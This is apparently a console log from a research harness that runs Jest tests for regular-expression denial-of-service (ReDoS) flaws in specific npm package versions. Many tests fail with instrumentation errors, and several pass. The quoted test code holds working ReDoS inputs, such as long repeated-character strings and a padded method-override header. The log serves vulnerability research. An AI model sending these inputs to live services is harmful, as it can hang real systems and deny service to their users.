b"Loaded babel plugin\n  console.log\n    [ 'Parser', 'DefaultHandler', 'RssHandler', 'ElementType', 'DomUtils' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'DefaultHandler', 'Parser' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 4, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/hosted-git-info_3.0.0/hosted-git-info.test.js
FAIL hosted-git-info_3.0.0/hosted-git-info.test.js
  ✕ ReDos in hosted-git-info (138 ms)

  ● ReDos in hosted-git-info

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/lru-cache/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in hosted-git-info

    TypeError: hostedGitInfo.fromUrl is not a function

       5 |   var attack_str = "a:" + genstr(49000, "a") + "!";
       6 |   let t = measureTime(function () {
    >  7 |     var parsedInfo = hostedGitInfo.fromUrl(attack_str);
         |                                    ^
       8 |   });
       9 |   let time = t[0] + t[1] / 1000000000;
      10 |   expect(time).toBeGreaterThan(1);

      at f (hosted-git-info_3.0.0/hosted-git-info.test.js:7:36)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (hosted-git-info_3.0.0/hosted-git-info.test.js:6:11)

  ● ReDos in hosted-git-info

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.086 s
Ran all test suites matching /redos\/hosted-git-info_3.0.0\/hosted-git-info.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/hosted-git-info_3.0.0/hosted-git-info.test.js']' returned non-zero exit status 1.
redos/urlregex_0.5.0/urlregex.test.js
PASS urlregex_0.5.0/urlregex.test.js (8.366 s)
  ✓ ReDos in urlregex (7966 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        8.746 s, estimated 9 s
Ran all test suites matching /redos\/urlregex_0.5.0\/urlregex.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, -1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/react-native_0.63.0-rc.0/react-native.test.js
FAIL react-native_0.63.0-rc.0/react-native.test.js
  ✕ ReDos in react-native (1663 ms)

  ● ReDos in react-native

    SyntaxError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/react-native/index.js: Unexpected token, expected "{" (13:7)

      11 | 'use strict';
      12 |
    > 13 | import typeof AccessibilityInfo from './Libraries/Components/AccessibilityInfo/AccessibilityInfo';
         |        ^
      14 | import typeof ActivityIndicator from './Libraries/Components/ActivityIndicator/ActivityIndicator';
      15 | import typeof Button from './Libraries/Components/Button';
      16 | import typeof CheckBox from './Libraries/Components/CheckBox/CheckBox';

      at Parser._raise (../node_modules/@babel/parser/src/parser/error.js:150:45)
      at Parser.raiseWithData (../node_modules/@babel/parser/src/parser/error.js:145:17)
      at Parser.raise (../node_modules/@babel/parser/src/parser/error.js:89:17)
      at Parser.unexpected (../node_modules/@babel/parser/src/parser/util.js:174:16)
      at Parser.expect (../node_modules/@babel/parser/src/parser/util.js:150:28)
      at Parser.parseNamedImportSpecifiers (../node_modules/@babel/parser/src/parser/statement.js:2618:10)
      at Parser.parseImport (../node_modules/@babel/parser/src/parser/statement.js:2425:39)
      at Parser.parseStatementContent (../node_modules/@babel/parser/src/parser/statement.js:422:25)
      at Parser.parseStatement (../node_modules/@babel/parser/src/parser/statement.js:329:17)
      at Parser.parseBlockOrModuleBlockBody (../node_modules/@babel/parser/src/parser/statement.js:1073:25)

  ● ReDos in react-native

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        2.578 s
Ran all test suites matching /redos\/react-native_0.63.0-rc.0\/react-native.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/react-native_0.63.0-rc.0/react-native.test.js']' returned non-zero exit status 1.
redos/ms_0.7.0/ms.test.js
PASS ms_0.7.0/ms.test.js
  ✓ ReDos in ms (2286 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.185 s
Ran all test suites matching /redos\/ms_0.7.0\/ms.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/express-validators_1.0.3/express-validators.test.js
PASS express-validators_1.0.3/express-validators.test.js
  ✓ ReDos in express-validators (1533 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.43 s
Ran all test suites matching /redos\/express-validators_1.0.3\/express-validators.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'defaultMessages',   'capitalise',\n      'afterValidate',     'afterMessage',\n      'alphaValidate',     'alpha_numValidate',\n      'arrayValidate',     'beforeValidate',\n      'beforeMessage',     'betweenValidate',\n      'betweenMessage',    'booleanValidate',\n      'confirmedValidate', 'confirmedMessage',\n      'dateValidate',      'notEqualValidate',\n      'notEqualMessage',   'numericValidate',\n      'lengthValidate',    'lengthMessage',\n      'emailValidate',     'inValidate',\n      'inMessage',         'ipValidate',\n      'notInValidate',     'notInMessage',\n      'issetValidate',     'regexValidate',\n      'requiredValidate',  'requiredIfValidate',\n      'stringValidate',    'urlValidate',\n      'getDefaultMessage', 'amountValidate',\n      'keyToName',         'validate',\n      'validator'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'validator' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/amqp-match_0.0.0/amqp-match.test.js
PASS amqp-match_0.0.0/amqp-match.test.js
  ✓ ReDoS in amqp-match (1723 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.517 s, estimated 3 s
Ran all test suites matching /redos\/amqp-match_0.0.0\/amqp-match.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/html-parse-stringify_2.0.0/html-parser-stringfy.test.js
PASS html-parse-stringify_2.0.0/html-parser-stringfy.test.js
  ✓ ReDos in html-parse-stringify (1677 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.574 s
Ran all test suites matching /redos\/html-parse-stringify_2.0.0\/html-parser-stringfy.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'parse', 'stringify' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parse' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/glob-parent_5.0.0/glob-parent.test.js
PASS glob-parent_5.0.0/glob-parent.test.js (10.82 s)
  ✓ ReDos in glob-parent (10296 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        11.186 s
Ran all test suites matching /redos\/glob-parent_5.0.0\/glob-parent.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/cejs_2.0.20170212/cejs.test.js
FAIL cejs_2.0.20170212/cejs.test.js
  ✕ ReDoS in cejs (105 ms)

  ● ReDoS in cejs

    ReferenceError: attack_str is not defined

      2 |   const c = require("cejs");
      3 |   const measureTime = require("../utils").measureTime;
    > 4 |   attack_str = ".".repeat(7000000) + "\n%";
        |             ^
      5 |   let t = measureTime(function () {
      6 |     c.run(attack_str);
      7 |   });

      at Object.<anonymous> (cejs_2.0.20170212/cejs.test.js:4:13)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.1 s
Ran all test suites matching /redos\/cejs_2.0.20170212\/cejs.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/cejs_2.0.20170212/cejs.test.js']' returned non-zero exit status 1.
redos/charset_1.0.0/charset.test.js
PASS charset_1.0.0/charset.test.js
  ✓ ReDoS in charset (2149 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.06 s
Ran all test suites matching /redos\/charset_1.0.0\/charset.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/browserslist_4.16.4/browserlist.test.js
FAIL browserslist_4.16.4/browserlist.test.js
  ✕ ReDoS in browserslist (402 ms)

  ● ReDoS in browserslist

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/caniuse-lite/dist/unpacker/feature.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDoS in browserslist

    expect(received).toBeGreaterThan(expected)

    Expected: > 1
    Received:   0.000054036

       8 |   });
       9 |   let time = t[0] + t[1] / 1000000000;
    > 10 |   expect(time).toBeGreaterThan(1);
         |                ^
      11 | });
      12 | 

      at Object.<anonymous> (browserslist_4.16.4/browserlist.test.js:10:16)

  ● ReDoS in browserslist

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.3 s
Ran all test suites matching /redos\/browserslist_4.16.4\/browserlist.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/browserslist_4.16.4/browserlist.test.js']' returned non-zero exit status 1.
redos/remarkable_1.7.2/remarkable.test.js
PASS remarkable_1.7.2/remarkable.test.js
  ✓ ReDos in remarkable (4075 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.854 s, estimated 6 s
Ran all test suites matching /redos\/remarkable_1.7.2\/remarkable.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'utils', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'prototype' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 9\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/url-regex_5.0.0/url-regex.test.js
FAIL url-regex_5.0.0/url-regex.test.js
  ✕ ReDos in url-regex (31 ms)

  ● ReDos in url-regex

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/url-regex/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in url-regex

    TypeError: require(...) is not a function

      3 |   const measureTime = require("../utils").measureTime;
      4 |   let t = measureTime(function () {
    > 5 |     require("url-regex")({ strict: false }).test(
        |     ^
      6 |       "018137.113.425.552.100.215.144.175250.45.147.1364868726sgdm6nohQ"
      7 |     );
      8 |   });

      at f (url-regex_5.0.0/url-regex.test.js:5:5)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (url-regex_5.0.0/url-regex.test.js:4:11)

  ● ReDos in url-regex

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.934 s
Ran all test suites matching /redos\/url-regex_5.0.0\/url-regex.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/url-regex_5.0.0/url-regex.test.js']' returned non-zero exit status 1.
redos/is-url_1.2.2/is-url.test.js
PASS is-url_1.2.2/is-url.test.js
  ✓ ReDos in is-url (1620 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.534 s
Ran all test suites matching /redos\/is-url_1.2.2\/is-url.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/ua-parser-js_0.7.22/ua-parser.test.js
PASS ua-parser-js_0.7.22/ua-parser.test.js
  ✓ ReDos in ua-parser-js (3285 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.194 s
Ran all test suites matching /redos\/ua-parser-js_0.7.22\/ua-parser.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'VERSION',  'BROWSER',\n      'CPU',      'DEVICE',\n      'ENGINE',   'OS',\n      'UAParser', 'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/npm-user-validate_1.0.0/npm-user-validate.test.js
PASS npm-user-validate_1.0.0/npm-user-validate.test.js
  ✓ ReDos in npm-user-validate (1302 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.198 s
Ran all test suites matching /redos\/npm-user-validate_1.0.0\/npm-user-validate.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'email', 'pw', 'username', 'requirements' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'email' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/uri-js_2.1.1/uri-js.test.js
PASS uri-js_2.1.1/uri-js.test.js
  ✓ ReDos in uri-js (3097 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4 s
Ran all test suites matching /redos\/uri-js_2.1.1\/uri-js.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'IRI_SUPPORT',\n      'VALIDATE_SUPPORT',\n      'pctEncChar',\n      'pctDecChars',\n      'SCHEMES',\n      'parse',\n      '_recomposeAuthority',\n      'removeDotSegments',\n      'serialize',\n      'resolveComponents',\n      'resolve',\n      'normalize',\n      'equal',\n      'escapeComponent',\n      'unescapeComponent'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parse' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/three_0.122.0/three.test.js
PASS three_0.122.0/three.test.js (5.998 s)
  ✓ ReDos in three (5462 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        6.376 s
Ran all test suites matching /redos\/three_0.122.0\/three.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.warn\n    THREE.Color: Unknown color rgb(\n\n       6 |   let t = measureTime(function () {\n       7 |     var Color = three.Color;\n    >  8 |     new Color(attack_str);\n         |     ^\n       9 |   });\n      10 |   let time = t[0] + t[1] / 1000000000;\n      11 |   expect(time).toBeGreaterThan(1);\n\n      at Color.setColorName (node_modules/three/build/three.js:6411:13)\n      at Color.setStyle (node_modules/three/build/three.js:6396:17)\n      at Color.set (node_modules/three/build/three.js:6275:10)\n      at new Color (node_modules/three/build/three.js:6261:17)\n      at f (three_0.122.0/three.test.js:8:5)\n      at measureTime (utils.js:35:3)\n      at Object.<anonymous> (three_0.122.0/three.test.js:6:11)\n\n  console.log\n    [\n      'ACESFilmicToneMapping',\n      'AddEquation',\n      'AddOperation',\n      'AdditiveAnimationBlendMode',\n      'AdditiveBlending',\n      'AlphaFormat',\n      'AlwaysDepth',\n      'AlwaysStencilFunc',\n      'AmbientLight',\n      'AmbientLightProbe',\n      'AnimationClip',\n      'AnimationLoader',\n      'AnimationMixer',\n      'AnimationObjectGroup',\n      'AnimationUtils',\n      'ArcCurve',\n      'ArrayCamera',\n      'ArrowHelper',\n      'Audio',\n      'AudioAnalyser',\n      'AudioContext',\n      'AudioListener',\n      'AudioLoader',\n      'AxesHelper',\n      'AxisHelper',\n      'BackSide',\n      'BasicDepthPacking',\n      'BasicShadowMap',\n      'BinaryTextureLoader',\n      'Bone',\n      'BooleanKeyframeTrack',\n      'BoundingBoxHelper',\n      'Box2',\n      'Box3',\n      'Box3Helper',\n      'BoxBufferGeometry',\n      'BoxGeometry',\n      'BoxHelper',\n      'BufferAttribute',\n      'BufferGeometry',\n      'BufferGeometryLoader',\n      'ByteType',\n      'Cache',\n      'Camera',\n      'CameraHelper',\n      'CanvasRenderer',\n      'CanvasTexture',\n      'CatmullRomCurve3',\n      'CineonToneMapping',\n      'CircleBufferGeometry',\n      'CircleGeometry',\n      'ClampToEdgeWrapping',\n      'Clock',\n      'ClosedSplineCurve3',\n      'Color',\n      'ColorKeyframeTrack',\n      'CompressedTexture',\n      'CompressedTextureLoader',\n      'ConeBufferGeometry',\n      'ConeGeometry',\n      'CubeCamera',\n      'CubeGeometry',\n      'CubeReflectionMapping',\n      'CubeRefractionMapping',\n      'CubeTexture',\n      'CubeTextureLoader',\n      'CubeUVReflectionMapping',\n      'CubeUVRefractionMapping',\n      'CubicBezierCurve',\n      'CubicBezierCurve3',\n      'CubicInterpolant',\n      'CullFaceBack',\n      'CullFaceFront',\n      'CullFaceFrontBack',\n      'CullFaceNone',\n      'Curve',\n      'CurvePath',\n      'CustomBlending',\n      'CustomToneMapping',\n      'CylinderBufferGeometry',\n      'CylinderGeometry',\n      'Cylindrical',\n      'DataTexture',\n      'DataTexture2DArray',\n      'DataTexture3D',\n      'DataTextureLoader',\n      'DecrementStencilOp',\n      'DecrementWrapStencilOp',\n      'DefaultLoadingManager',\n      'DepthFormat',\n      'DepthStencilFormat',\n      'DepthTexture',\n      'DirectionalLight',\n      'DirectionalLightHelper',\n      'DiscreteInterpolant',\n      'DodecahedronBufferGeometry',\n      'DodecahedronGeometry',\n      'DoubleSide',\n      'DstAlphaFactor',\n      'DstColorFactor',\n      ... 365 more items\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'Color' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/method-override_2.0.0/method-override.test.js
FAIL method-override_2.0.0/method-override.test.js
  ✕ ReDos in method-override (183 ms)

  ● ReDos in method-override

    SyntaxError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/methods/index.js: 'return' outside of function. (9:2)

       7 |   });
       8 |
    >  9 |   return;
         |   ^
      10 | }
      11 |
      12 | module.exports = [

      at Parser._raise (../node_modules/@babel/parser/src/parser/error.js:150:45)
      at Parser.raiseWithData (../node_modules/@babel/parser/src/parser/error.js:145:17)
      at Parser.raise (../node_modules/@babel/parser/src/parser/error.js:89:17)
      at Parser.parseReturnStatement (../node_modules/@babel/parser/src/parser/statement.js:766:12)
      at Parser.parseStatementContent (../node_modules/@babel/parser/src/parser/statement.js:375:21)
      at Parser.parseStatement (../node_modules/@babel/parser/src/parser/statement.js:329:17)
      at Parser.parseBlockOrModuleBlockBody (../node_modules/@babel/parser/src/parser/statement.js:1073:25)
      at Parser.parseBlockBody (../node_modules/@babel/parser/src/parser/statement.js:1049:10)
      at Parser.parseBlock (../node_modules/@babel/parser/src/parser/statement.js:1019:10)
      at Parser.parseStatementContent (../node_modules/@babel/parser/src/parser/statement.js:398:21)

  ● ReDos in method-override

    TypeError: methodOverride is not a function

      3 |   const measureTime = require("../utils").measureTime;
      4 |   let t = measureTime(function () {
    > 5 |     let middleware = methodOverride();
        |                      ^
      6 |     middleware(
      7 |       {
      8 |         headers: { "x-http-method-override": " ".repeat(40000) },

      at f (method-override_2.0.0/method-override.test.js:5:22)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (method-override_2.0.0/method-override.test.js:4:11)

  ● ReDos in method-override

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
